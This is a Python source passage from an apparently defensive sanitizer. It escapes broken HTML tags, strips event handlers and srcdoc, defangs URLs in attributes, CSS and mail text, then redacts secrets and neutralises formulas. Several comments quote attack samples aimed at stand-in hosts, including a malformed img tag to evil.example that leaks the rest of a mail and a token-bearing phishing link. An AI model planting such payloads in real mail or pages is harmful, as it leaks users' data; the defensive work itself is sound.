_HTML_TAG_RE = re.compile(r"<(/?)([a-zA-Z][\w:.-]*)((?:\"[^\"<]*\"|'[^'<]*'|[^'\"<>])*)>")
# A tag opener whose attribute region opens a quote it never closes before the next '>' -- to an HTML5
# tokenizer the quoted value runs on until the NEXT quote in the document, swallowing the '>' and whatever
# follows, so `<img src="https://evil.example/x?a=1><p>host "acme"` becomes a live fetch with the rest of
# the mail in its query string. _HTML_TAG_RE (balanced quotes) cannot match it and the mail-text splitter
# treats it as a tag: it fell through both. The opener is escaped so the renderer sees text (found in
# review, 2026-09-05).
_HTML_BROKEN_OPENER_RE = re.compile(r"<(?=[a-zA-Z])")


def _escape_broken_openers(text, notes):
    """Escape every tag opener _HTML_TAG_RE could not read that a tokenizer would still act on: an opener
    whose region (up to the next '>') holds an unbalanced quote, or a '<' inside a quoted value. Runs
    AFTER the tag pass, so every well-formed tag is already rewritten and left alone here."""
    openers = [m.start() for m in _HTML_BROKEN_OPENER_RE.finditer(text)]
    if not openers:
        return text
    # Quote parity from each opener to the next '>' -- one pass from the right, not a scan per opener.
    dq = sq = 0
    odd = {}
    oi = len(openers) - 1
    for p in range(len(text) - 1, -1, -1):
        c = text[p]
        if c == ">":
            dq = sq = 0
        elif c == '"':
            dq += 1
        elif c == "'":
            sq += 1
        while oi >= 0 and openers[oi] == p:
            odd[p] = bool((dq & 1) or (sq & 1))
            oi -= 1
    out, pos = [], 0
    for i in openers:
        if i < pos:
            continue
        m = _HTML_TAG_RE.match(text, i)
        if m:                                            # a well-formed tag: leave it
            continue
        gt = text.find(">", i, i + 65536)
        if gt == -1:
            continue                                     # never closes: not a tag to any tokenizer
        if odd[i] or "<" in text[i + 1:gt]:
            notes.append({"type": "html_strip", "original": "unbalanced quote in tag"})
            out.append(text[pos:i]); out.append("&lt;"); pos = i + 1
    out.append(text[pos:])
    return "".join(out)


# One attribute, the way the WHATWG tokenizer reads it: a name runs to whitespace, '/', '>' or '=', and a
# quoted value may be followed directly by the next name (`"x"href=` is a parse error that still creates
# both attributes). Decisions are made per attribute BY NAME -- a substring search for ` on…=` matched
# inside a quoted value and a regex that required a space before the name missed the adjacent form.
_HTML_ATTR_RE = re.compile(
    r"""(?P<lead>[\s/]*)(?P<name>[^\s/>="'][^\s/>=]*|=[^\s/>=]*)"""
    r"""(?P<eq>\s*=\s*(?:"(?P<dq>[^"]*)"|'(?P<sq>[^']*)'|(?P<uq>[^\s>]*)))?""", re.DOTALL)
_HTML_ATTR_LEAD_RE = re.compile(r"[\s/]*")
_HTML_URL_ATTRS = frozenset(("href|src|action|formaction|poster|background|ping|cite|longdesc|usemap|data|"
                             "xlink:href|dynsrc|lowsrc|manifest|codebase|classid|srcdoc|srcset|style").split("|"))
_INERT_SCHEMES = {"hxxp", "hxxps", "fxp", "fxps"}          # our own output; never re-defanged (idempotency)
_CSS_URL_RE = re.compile(
    r"""(url\(\s*(['"]?))([^)'"(]*)((?:\2)\s*\))|(@import\s+(['"]?))([^'";\s]+)|((?:-webkit-)?image-set\(\s*(['"]))([^'"]+)(\9)""",
    re.IGNORECASE)
# CSS lets an ident be spelled with backslash escapes: \75rl( is url(. Decode them before deciding.
_CSS_ESCAPE_RE = re.compile(r"\\([0-9a-fA-F]{1,6})[ \t\n]?|\\([^0-9a-fA-F\n])")


def _css_unescape(css):
    def _u(m):
        if m.group(1):
            try:
                return chr(int(m.group(1), 16))
            except (ValueError, OverflowError):
                return ""
        return m.group(2)
    return _CSS_ESCAPE_RE.sub(_u, css)
_MAIL_MARKUP_RE = re.compile(
    r"(<[a-zA-Z][\w:.-]*(?:\"[^\"<]*\"|'[^'<]*'|[^'\"<>])*>|</[^<>]*>|<[!?][^<>]*>)", re.DOTALL)


def _split_mail_markup(text):
    """[text, markup, text, markup, ...]: comments first by find() (an unterminated one runs to the end of
    the document, as in a renderer), then tags, end tags and <!…>/<?…> bogus comments."""
    parts = []
    i = 0
    while True:
        a = text.find("<!--", i)
        if a == -1:
            seg, i, comment = text[i:], len(text), None
        else:
            b = text.find("-->", a + 4)
            seg = text[i:a]
            comment, i = (text[a:], len(text)) if b == -1 else (text[a:b + 3], b + 3)
        sub = _MAIL_MARKUP_RE.split(seg)
        if parts:
            parts[-1] += sub[0]; sub = sub[1:]
        parts.extend(sub)
        if comment is None:
            break
        parts.append(comment); parts.append("")
    return parts
_ANY_SCHEME_RE = re.compile(r"^\s*([a-zA-Z][a-zA-Z0-9+.-]*):")


def _defang_attr_value(decoded, allowed, notes, kind, keep_relative=True):
    """Decide one URL-ish attribute value AFTER entity decoding. Returns the value to write back (already
    defanged, still decoded -- caller re-escapes), or None when it stays as written."""
    # Browsers strip tab / newline / CR and leading-trailing C0 controls out of a URL before parsing, so
    # "java\tscript:" IS javascript: to the renderer. Decide on the stripped form and, if anything was
    # stripped, write the stripped form back so the smuggled bytes are gone too.
    # A backslash is a slash to the URL parser in every special scheme: "/\evil.example" is a
    # protocol-relative link and "https:/\evil.example" an absolute one.
    v = re.sub(r"[\t\n\r\x00-\x08\x0b\x0c\x0e-\x1f\x7f]", "", decoded).strip().replace("\\", "/")
    smuggled = v != decoded.strip()
    if not v or (keep_relative and not smuggled and not _ANY_SCHEME_RE.match(v) and not v.startswith("//")
                 and not re.match(r"^www\.", v, re.IGNORECASE) and not _HOST_RE.match(v)):
        return None                                     # relative path / fragment: nothing to fetch
    if _url_allowed(v, allowed):
        return None
    d = _defang(v, allowed)
    if d == v:
        m = _ANY_SCHEME_RE.match(v)                     # mailto:, tel:, ms-word:, ... -- not a link we keep
        if m and m.group(1).lower() in _INERT_SCHEMES:
            return None if not smuggled else v
        if m and m.group(1).lower() not in ("http", "https", "ftp", "ftps"):
            d = v[:m.start(1)] + m.group(1) + "[:]" + v[m.end():]
        else:
            m = _HOST_RE.match(v)                       # protocol-relative or bare dotted host
            if m:
                slashes, host, tail = m.groups()
                d = (slashes or "") + host.replace(".", "[.]") + tail
    if d != v or smuggled:
        notes.append({"type": kind, "original": v[:60]})
        return d
    return None


def _neutralize_css(css, allowed, notes):
    # Escaped spellings (\75rl( ) are decoded only when they hide a fetch token; ordinary CSS is untouched.
    dec = _css_unescape(css)
    if dec != css and re.search(r"(?i)url\s*\(|@import|image-set\s*\(", dec) and not re.search(r"(?i)url\s*\(|@import|image-set\s*\(", css):
        notes.append({"type": "html_css", "original": "css escape hid a fetch token"})
        css = dec

    def _u(m):
        # The argument is decoded too: url(//evil\2e example/x) is url(//evil.example/x) to the tokenizer.
        if m.group(1):                                   # url(...)
            target = _css_unescape(m.group(3))
            d = _defang_attr_value(target, allowed, notes, "html_css")
            return m.group(0) if d is None else m.group(1) + d + m.group(4)
        if m.group(5):                                   # @import
            target = _css_unescape(m.group(7))
            d = _defang_attr_value(target, allowed, notes, "html_css")
            return m.group(0) if d is None else m.group(5) + d
        target = _css_unescape(m.group(10))              # image-set('...')
        d = _defang_attr_value(target, allowed, notes, "html_css")
        return m.group(0) if d is None else m.group(8) + d + m.group(11)
    css = _CSS_URL_RE.sub(_u, css)
    # expression() and -moz-binding are script vectors in legacy engines; make them inert
    return re.sub(r"(?i)\b(expression|-moz-binding)\s*\(", r"\1[(]", css)


def _neutralize_tag(m, allowed, notes):
    slash, name, attrs = m.group(1), m.group(2), m.group(3)
    if not attrs:
        return m.group(0)
    out, pos, changed = [], 0, False
    i, n = 0, len(attrs)
    while i < n:
        a = _HTML_ATTR_RE.match(attrs, i)
        if not a or a.end() == i:
            # stray byte: kept verbatim. Skip the whole whitespace run first, or a tag padded with 20 000
            # spaces is re-scanned from each of them.
            i = _HTML_ATTR_LEAD_RE.match(attrs, i).end() + 1
            continue
        i = a.end()
        aname = a.group("name").lower()
        if aname.startswith("on") and len(aname) > 2:
            notes.append({"type": "html_handler", "original": a.group(0).strip()[:60]})
            out.append(attrs[pos:a.start()]); pos = a.end(); changed = True
            continue
        if aname not in _HTML_URL_ATTRS or a.group("eq") is None:
            continue
        raw = a.group("dq") if a.group("dq") is not None else (a.group("sq") if a.group("sq") is not None else a.group("uq"))
        q = '"' if a.group("dq") is not None else ("'" if a.group("sq") is not None else "")
        decoded = _html.unescape(raw)
        if aname == "style":
            new = _neutralize_css(decoded, allowed, notes)
            if new == decoded:
                continue
        elif aname == "srcset":
            parts = []
            hit = False
            for cand in decoded.split(","):
                cand = cand.strip()
                if not cand:
                    continue
                url, _, desc = cand.partition(" ")
                d = _defang_attr_value(url, allowed, notes, "html_src")
                if d is not None:
                    hit = True
                    url = d
                parts.append((url + " " + desc).strip())
            if not hit:
                continue
            new = ", ".join(parts)
        elif aname == "srcdoc":
            notes.append({"type": "html_strip", "original": "srcdoc"})
            out.append(attrs[pos:a.start()]); pos = a.end(); changed = True
            continue                                     # an inline document is an iframe by another name
        else:
            kind = "html_link" if aname in ("href", "xlink:href", "cite", "longdesc") else "html_src"
            d = _defang_attr_value(decoded, allowed, notes, kind, keep_relative=aname not in ("action", "formaction"))
            if d is None:
                continue
            new = d
        q = q or '"'
        # Re-escape only what the attribute needs: & < > and the delimiting quote. Escaping the OTHER
        # quote would rewrite CSS like url( 'x' ) inside a double-quoted style attribute for no reason.
        esc = _html.escape(new, quote=False).replace(q, "&quot;" if q == '"' else "&#x27;")
        eq = re.match(r"\s*=\s*", a.group("eq")).group(0)
        out.append(attrs[pos:a.start()]); out.append((a.group("lead") or " ") + a.group("name") + eq + q + esc + q)
        pos = a.end(); changed = True
    if not changed:
        return m.group(0)
    out.append(attrs[pos:])
    return "<" + slash + name + "".join(out) + ">"


def _neutralize_html(text, notes, allowed=frozenset(), mail=False):
    if "<" not in text and not mail:
        return text
    text = _strip_code_blocks(text, notes, allowed)

    def _inert(m):
        notes.append({"type": "html_strip", "original": "inert tag"})
        return "&lt;"
    text = _HTML_INERT_TAG_RE.sub(_inert, text)

    text = _HTML_TAG_RE.sub(lambda m: _neutralize_tag(m, allowed, notes), text)
    text = _escape_broken_openers(text, notes)

    if mail:
        # A mail client auto-links a bare URL in text, so in a mail body bare is clickable: defang every
        # URL outside a tag that is not into the tenant. Entities are decoded for the decision and the
        # segment is re-escaped only when something changed, so untouched text stays byte-identical.
        # Split on what a renderer reads as markup (tags, end tags, comments, <! and <? bogus comments).
        # A stray '<' in prose ("risk < 50 ... > 3pm") is text, and the URL between two of them must not
        # hide from this pass.
        parts = _split_mail_markup(text)
        for i in range(0, len(parts), 2):
            seg = parts[i]
            if not seg:
                continue
            decoded = _html.unescape(seg)
            if not re.search(r"(?i)(?:https?|ftps?):|www\.", decoded):
                continue
            d = _defang(decoded, allowed)
            if d != decoded:
                notes.append({"type": "mail_url", "original": "bare url in mail text"})
                parts[i] = _html.escape(d, quote=False)
        text = "".join(parts)
    return text


def neutralize_output(text, allowed_hosts=frozenset(), mail=False):
    """Defang markdown-link targets, redact secrets/structured-PII, then quote-prefix executable formulas
    (+ defang URLs on those lines). Bare URLs and free-form PII in prose are out of scope (documented
    residuals). Pure and deterministic. Link defang runs FIRST -- see the ordering note in the body: with
    redaction first, its value match could consume a link's closing bracket and leave the URL live."""
    if not text:
        return text, []
    notes = []
    allowed = frozenset(allowed_hosts or ())

    # HTML first: it works on tags and attributes and never on markdown syntax, and the autolink pass
    # must run before the tag pass so <https://x> is read as a link, not a tag named "https".
    def _auto(m):
        inner = m.group(1)
        d = _defang_target(inner, allowed)
        if d != inner:
            notes.append({"type": "link", "original": inner[:60]})
        return "<" + d + ">"
    text = _MD_AUTOLINK_RE.sub(_auto, text)
    text = _neutralize_html(text, notes, allowed, mail)

    def _refdef(m):
        target = m.group(2)
        # "[Host]: WIN-DC01.corp.local" and "[Evidence]: report.csv" are labelled fields, the most natural
        # way to write one, and a renderer that did read them as reference definitions would make a
        # relative link of the value. Only a URL-shaped destination is a link.
        if not re.match(r"(?i)^<?(?:[a-z][a-z0-9+.-]*:|//|www\.)", target):
            return m.group(0)
        d = _defang_target(target, allowed)
        if d != target:
            notes.append({"type": "link", "original": target[:60]})
        return m.group(1) + d
    text = _MD_REF_DEF_RE.sub(_refdef, text)

    # ORDER MATTERS. Link defang runs BEFORE redaction, not after. A credential-shaped query parameter
    # (`[reset](https://evil/login?token=abc123).`) puts both controls on one span, and whichever runs
    # first wins: with redaction first, its value match consumed the link's closing ")" and _MD_LINK_RE
    # could no longer see a link -- leaving a LIVE clickable phishing URL in a persisted note.
    # Defanging first makes that impossible for EVERY value shape rather than for the
    # shapes a fixture happens to cover: by the time the redactor runs, the host is already inert, so
    # whatever it consumes it cannot re-arm a link. Redaction still sees the query value verbatim (defang
    # rewrites the scheme and host, never the query string), so nothing is lost.
    text = _defang_md_inline_links(text, allowed, notes)

    text = redact_secrets(text, notes)

    text = _neutralize_formulas(text, notes, allowed)
    return text, notes
